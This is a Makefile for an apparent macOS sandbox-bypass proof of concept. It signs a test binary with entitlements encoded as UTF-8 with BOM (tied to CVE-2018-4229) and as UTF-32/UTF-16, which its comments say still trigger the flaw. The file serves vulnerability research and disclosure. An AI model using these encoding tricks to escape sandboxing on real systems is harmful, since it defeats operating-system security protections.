LDFLAGS =-Wl,-sectcreate,__TEXT,__info_plist,Info.plist

# Adapt signing identity to locally available cert name
SIGNING_IDENTITY=Developer

all: sandboxed unsandboxed

sandbox-poc: sandbox-poc.c
	clang -o sandbox-poc sandbox-poc.c $(LDFLAGS)

sandboxed: sandbox-poc
	cp sandbox-poc sandboxed-poc
	codesign --force -s $(SIGNING_IDENTITY) --entitlements entitlements/utf8.xml sandboxed-poc

unsandboxed: sandbox-poc
	# entitlements encoded with UTF-8 and BOM, fixed as CVE-2018-4229
	cp sandbox-poc unsandboxed-poc
	codesign --force -s $(SIGNING_IDENTITY) --entitlements entitlements/utf8+bom.xml unsandboxed-poc
	
	# entitlements encoded with UTF-32 (or UTF-16) still trigger the same problem
	cp sandbox-poc unsandboxed-poc-utf32
	codesign --force -s $(SIGNING_IDENTITY) --entitlements entitlements/utf32.xml unsandboxed-poc-utf32

clean:
	rm -f sandbox-poc sandboxed-poc unsandboxed-poc unsandboxed-poc-utf32
